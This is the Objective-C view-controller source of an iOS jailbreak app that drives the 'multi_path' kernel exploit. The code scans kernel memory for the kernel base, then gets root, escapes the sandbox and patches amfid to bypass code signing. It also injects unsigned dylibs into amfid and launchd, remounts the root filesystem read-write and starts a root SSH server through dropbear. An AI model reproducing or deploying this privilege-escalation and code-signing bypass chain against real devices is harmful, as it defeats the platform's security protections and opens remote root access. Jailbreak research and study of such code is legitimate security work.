//
//  ViewController.m
//  multi_path
//
//  Created by Ian Beer on 5/28/18.
//  Copyright © 2018 Ian Beer. All rights reserved.
//


#import "ViewController.h"
#include "sploit.h"
#include "jelbrek.h"
#include "kern_utils.h"
#include "offsetof.h"
#include "patchfinder64.h"
#include "shell.h"
#include "kexecute.h"
#include "unlocknvram.h"
#include "remap_tfp_set_hsp.h"
#include "inject_criticald.h"
#include "bootstrap.h"
#include "libjb.h"

//#include "amfid.h"

#include <sys/stat.h>
#include <sys/spawn.h>
#include <mach/mach.h>

#include <ifaddrs.h>
#include <arpa/inet.h>

mach_port_t taskforpidzero;
uint64_t kernel_base, kslide;

//Jonathan Seals: https://github.com/JonathanSeals/kernelversionhacker
uint64_t find_kernel_base() {
#define IMAGE_OFFSET 0x2000
#define MACHO_HEADER_MAGIC 0xfeedfacf
#define MAX_KASLR_SLIDE 0x21000000
#define KERNEL_SEARCH_ADDRESS_IOS10 0xfffffff007004000
#define KERNEL_SEARCH_ADDRESS_IOS9 0xffffff8004004000
#define KERNEL_SEARCH_ADDRESS_IOS 0xffffff8000000000
    
#define ptrSize sizeof(uintptr_t)
    
    uint64_t addr = KERNEL_SEARCH_ADDRESS_IOS10+MAX_KASLR_SLIDE;
    
    
    while (1) {
        char *buf;
        mach_msg_type_number_t sz = 0;
        kern_return_t ret = vm_read(taskforpidzero, addr, 0x200, (vm_offset_t*)&buf, &sz);
        
        if (ret) {
            goto next;
        }
        
        if (*((uint32_t *)buf) == MACHO_HEADER_MAGIC) {
            int ret = vm_read(taskforpidzero, addr, 0x1000, (vm_offset_t*)&buf, &sz);
            if (ret != KERN_SUCCESS) {
                printf("Failed vm_read %i\n", ret);
                goto next;
            }
            
            for (uintptr_t i=addr; i < (addr+0x2000); i+=(ptrSize)) {
                mach_msg_type_number_t sz;
                int ret = vm_read(taskforpidzero, i, 0x120, (vm_offset_t*)&buf, &sz);
                
                if (ret != KERN_SUCCESS) {
                    printf("Failed vm_read %i\n", ret);
                    exit(-1);
                }
                if (!strcmp(buf, "__text") && !strcmp(buf+0x10, "__PRELINK_TEXT")) {
                    
                    printf("kernel base: 0x%llx\nkaslr slide: 0x%llx\n", addr, addr - 0xfffffff007004000);
                    
                    return addr;
                }
            }
        }
        
    next:
        addr -= 0x200000;
    }
}

@interface ViewController ()

@end

@implementation ViewController


//https://stackoverflow.com/questions/6807788/how-to-get-ip-address-of-iphone-programmatically
- (NSString *)getIPAddress {
    
    NSString *address = @"Are you connected to internet?";
    struct ifaddrs *interfaces = NULL;
    struct ifaddrs *temp_addr = NULL;
    int success = 0;
    // retrieve the current interfaces - returns 0 on success
    success = getifaddrs(&interfaces);
    if (success == 0) {
        // Loop through linked list of interfaces
        temp_addr = interfaces;
        while(temp_addr != NULL) {
            if(temp_addr->ifa_addr->sa_family == AF_INET) {
                // Check if interface is en0 which is the wifi connection on the iPhone
                if([[NSString stringWithUTF8String:temp_addr->ifa_name] isEqualToString:@"en0"]) {
                    // Get NSString from C String
                    address = [NSString stringWithUTF8String:inet_ntoa(((struct sockaddr_in *)temp_addr->ifa_addr)->sin_addr)];
                    
                }
                
            }
            
            temp_addr = temp_addr->ifa_next;
        }
    }
    // Free memory
    freeifaddrs(interfaces);
    return address;
    
}

-(void)log:(NSString*)log {
    self.logs.text = [NSString stringWithFormat:@"%@%@\n", self.logs.text, log];
}

-(void)jelbrek {
    //-------------basics-------------//
    get_root(getpid()); //setuid(0)
    setcsflags(getpid());
    unsandbox(getpid());
    platformize(getpid()); //tf_platform

    if (geteuid() == 0) {
        
        [self log:@"Success! Got root!"];
        
        FILE *f = fopen("/var/mobile/.roottest", "w");
        if (f == 0) {
            [self log:@"Failed to escape sandbox!"];
            return;
        }
        else
            [self log:[NSString stringWithFormat:@"Successfully got out of sandbox! Wrote file! %p", f]];
        fclose(f);
        unlink("/var/mobile/.roottest");
        
    }
    else {
        [self log:@"Failed to get root!"];
        return;
    }

    //-------------amfid-------------//
    
    
    uint64_t selfcred = borrowEntitlementsFromDonor("/usr/bin/sysdiagnose", NULL); //allow us to get amfid's task
    
   /* entitlePid(getpid(), "get-task-allow", true);
    entitlePid(getpid(), "com.apple.system-task-ports", true);
    entitlePid(getpid(), "task_for_pid-allow", true);
    entitlePid(getpid(), "com.apple.private.memorystatus", true);*/ //doesn't work?
    
    NSString *tester = [NSString stringWithFormat:@"%@/bins/tester", @(bundle_path())]; //test binary
    chmod([tester UTF8String], 777); //give it proper permissions
    
    if (launch((char*)[tester UTF8String], NULL, NULL, NULL, NULL, NULL, NULL, NULL)) castrateAmfid(); //patch amfid
    
    pid_t amfid = pid_for_name("amfid");
    platformize(amfid);
    //add required entitlements to load unsigned library
    entitlePid(amfid, "get-task-allow", true);
    entitlePid(amfid, "com.apple.private.skip-library-validation", true);
    setcsflags(amfid);
    
    //add required entitlements to load unsigned library
    entitlePid(1, "get-task-allow", true);
    entitlePid(1, "com.apple.private.skip-library-validation", true);
    setcsflags(1);
    
    //amfid payload
    sleep(1);
    NSString *pl = [NSString stringWithFormat:@"%@/dylibs/amfid_payload.dylib", @(bundle_path())];
    int rv2 = inject_dylib(amfid, (char*)[pl UTF8String]); //properly patch amfid
    sleep(1);
    
    //binary to test codesign patch
    NSString *testbin = [NSString stringWithFormat:@"%@/bins/test", @(bundle_path())]; //test binary
    chmod([testbin UTF8String], 0777); //give it proper permissions
    //undoCredDonation(selfcred);
    
    //-------------codesign test-------------//
    
    int rv = launch((char*)[testbin UTF8String], NULL, NULL, NULL, NULL, NULL, NULL, NULL);

    [self log:(rv) ? @"Failed to patch codesign!" : @"SUCCESS! Patched codesign!"];
    [self log:(rv2) ? @"Failed to inject code to amfid!" : @"Code injection success!"];
    
    //-------------remount-------------//
    
    if (@available(iOS 11.3, *)) {
        [self log:@"Remount eta son?"];
    } else if (@available(iOS 11.0, *)) {
        remount1126();
        [self log:[NSString stringWithFormat:@"Did we mount / as read+write? %s", [[NSFileManager defaultManager] fileExistsAtPath:@"/RWTEST"] ? "yes" : "no"]];
    }
    
    
    //-------------host_get_special_port 4-------------//
    
    mach_port_t mapped_tfp0 = MACH_PORT_NULL;
    remap_tfp0_set_hsp4(&mapped_tfp0);
    [self log:[NSString stringWithFormat:@"enabled host_get_special_port_4_? %@", (mapped_tfp0 == MACH_PORT_NULL) ? @"FAIL" : @"SUCCESS"]];
    
    //-------------nvram-------------//
    
    unlocknvram();
    
    //-------------dropbear-------------//
    
    NSString *iosbinpack = @"/var/containers/Bundle/iosbinpack64";
    
    int dbret = -1;
    
    if (!rv && !rv2) {
        
        NSFileManager *fm = [NSFileManager defaultManager];
        
        [fm removeItemAtPath:@"/var/containers/Bundle/dylibs" error:nil];
        [fm copyItemAtPath:[[[NSBundle mainBundle] bundlePath] stringByAppendingString:@"/dylibs"] toPath:@"/var/containers/Bundle/dylibs" error:nil];
        
        sleep(1);
        
        if (![[NSFileManager defaultManager] fileExistsAtPath:@"/var/containers/Bundle/iosbinpack64"]) {
            if (bootstrap() != 0)  {
                term_kernel();
                term_kexecute();
                return;
            }
            sleep(1);
            createSymlinks();
        }
        
        [fm removeItemAtPath:@"/var/containers/Bundle/tweaksupport/Library/TweakInject/PreferenceLoader.dylib" error:nil];
        [fm removeItemAtPath:@"/var/containers/Bundle/tweaksupport/usr/lib/libprefs.dylib" error:nil];
        [fm moveItemAtPath:@"/var/containers/Bundle/dylibs/PreferenceLoader.dylib" toPath:@"/var/containers/Bundle/tweaksupport/Library/TweakInject/PreferenceLoader.dylib" error:nil];
        [fm moveItemAtPath:@"/var/containers/Bundle/dylibs/libprefs.dylib" toPath:@"/var/containers/Bundle/tweaksupport/usr/lib/libprefs.dylib" error:nil];
        

        NSString *dropbear = [NSString stringWithFormat:@"%@/usr/local/bin/dropbear", iosbinpack];
        NSString *bash = [NSString stringWithFormat:@"%@/bin/bash", iosbinpack];
        NSString *killall = [NSString stringWithFormat:@"%@/usr/bin/killall", iosbinpack];
        NSString *profile = [NSString stringWithFormat:@"%@/etc/profile", iosbinpack];
        NSString *motd = [NSString stringWithFormat:@"%@/etc/motd", iosbinpack];
        
        mkdir("/var/dropbear", 0777);
        unlink("/var/profile");
        unlink("/var/motd");
        cp([profile UTF8String], "/var/profile");
        cp([motd UTF8String], "/var/motd");
        chmod("/var/profile", 0777);
        chmod("/var/motd", 0777); //this can be read-only but just in case
        
        launch((char*)[killall UTF8String], "-SEGV", "dropbear", NULL, NULL, NULL, NULL, NULL);
        dbret = launchAsPlatform((char*)[dropbear UTF8String], "-R", "--shell", (char*)[bash UTF8String], "-E", "-p", "22", NULL); 
        
        //-------------launch daeamons-------------//
        //--you can drop any daemon plist in iosbinpack64/LaunchDaemons and it will be loaded automatically. "REPLACE_BIN" will automatically get replaced by the absolute path of iosbinpack64--//
        
        NSFileManager *fileManager = [NSFileManager defaultManager];
        NSString *launchdaemons = [NSString stringWithFormat:@"%@/LaunchDaemons", iosbinpack];
        NSString *launchctl = [NSString stringWithFormat:@"%@/bin/launchctl_", iosbinpack];
        NSArray *plists = [fileManager contentsOfDirectoryAtPath:launchdaemons error:nil];
        
        for (__strong NSString *file in plists) {
            
            printf("[*] Changing permissions of plist %s\n", [file UTF8String]);
            
            file = [[iosbinpack stringByAppendingString:@"/LaunchDaemons/"] stringByAppendingString:file];
    
            if (strstr([file UTF8String], "jailbreakd") != 0) {
                
                printf("[*] Found jailbreakd plist, special handling\n", "");
                
                NSMutableDictionary *job = [NSPropertyListSerialization propertyListWithData:[NSData dataWithContentsOfFile:file] options:NSPropertyListMutableContainers format:nil error:nil];
                
                job[@"EnvironmentVariables"][@"KernelBase"] = [NSString stringWithFormat:@"0x%16llx", kernel_base];
                [job writeToFile:file atomically:YES];
                
            }
            
            chmod([file UTF8String], 0644);
            chown([file UTF8String], 0, 0);
        }
        
        unlink("/var/log/testbin.log");
        unlink("/var/log/jailbreakd-stderr.log");
        unlink("/var/log/jailbreakd-stdout.log");
        
        launchAsPlatform((char*)[launchctl UTF8String], "unload", (char*)[launchdaemons UTF8String], NULL, NULL, NULL, NULL, NULL);
        launchAsPlatform((char*)[launchctl UTF8String], "load", (char*)[launchdaemons UTF8String], NULL, NULL, NULL, NULL, NULL);
        
        sleep(1);
        
        [self log:([fileManager fileExistsAtPath:@"/var/log/testbin.log"]) ? @"Successfully loaded daemons!" : @"Failed to load launch daemons!"];
        
        //---------jailbreakd----------//
        [self log:([fileManager fileExistsAtPath:@"/var/log/jailbreakd-stdout.log"]) ? @"Loaded jailbreakd!" : @"Failed to load jailbreakd!"];
    }
    
    if (!dbret) {
        if ([[self getIPAddress] isEqualToString:@"Are you connected to internet?"])
            [self log:@"Connect to Wi-fi in order to use SSH"];
        else
            [self log:[NSString stringWithFormat:@"SSH should be up and running\nconnect by running: \nssh root@%@", [self getIPAddress]]];
    }
    else {
        [self log:@"Failed to initialize SSH."];
    }
    
    NSString *lp = [NSString stringWithFormat:@"%@/dylibs/pspawn_payload.dylib", @(bundle_path())];
    if ([self.tweaksSwitch isOn]) inject_dylib(1, (char*)[lp UTF8String]);
    
    pid_t backboarddd = pid_for_name("backboardd");
    
    usleep(10000);
    
    term_kexecute();
    term_kernel();
    
    if ([self.tweaksSwitch isOn]) kill(backboarddd, SIGKILL); //bye bye...
    
}
- (IBAction)go:(id)sender {
    taskforpidzero = run();
    kernel_base = find_kernel_base();
    kslide = kernel_base - 0xfffffff007004000;
    
    if (taskforpidzero != MACH_PORT_NULL) {
        [self log:@"Exploit success!"];
        init_jelbrek(taskforpidzero, kernel_base);
        [self jelbrek];
    }
    else
        [self log:@"Exploit failed!"];
    
}
-(void)uninstall {
    //-------------basics-------------//
    get_root(getpid()); //setuid(0)
    setcsflags(getpid());
    unsandbox(getpid());
    platformize(getpid()); //tf_platform
    
    if (geteuid() == 0) {
        
        [self log:@"Success! Got root!"];
        
        FILE *f = fopen("/var/mobile/.roottest", "w");
        if (f == 0) {
            [self log:@"Failed to escape sandbox!"];
            return;
        }
        else
            [self log:[NSString stringWithFormat:@"Successfully got out of sandbox! Wrote file! %p", f]];
        fclose(f);
        unlink("/var/mobile/.roottest");
        
    }
    else {
        [self log:@"Failed to get root!"];
        return;
    }
    
    uninstall();
    
    term_kexecute();
    term_kernel();
    
    if (![[NSFileManager defaultManager] fileExistsAtPath:@"/var/containers/Bundle/iosbinpack64"]) {
        [self log:@"Sucessfully uninstalled!"];
    }

}
- (IBAction)uninstall:(id)sender {
    taskforpidzero = run();
    kernel_base = find_kernel_base();
    kslide = kernel_base - 0xfffffff007004000;
    
    if (taskforpidzero != MACH_PORT_NULL) {
        [self log:@"Exploit success!"];
        init_jelbrek(taskforpidzero, kernel_base);
        [self uninstall];
    }
    else
        [self log:@"Exploit failed!"];
}

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.
}


- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}


@end
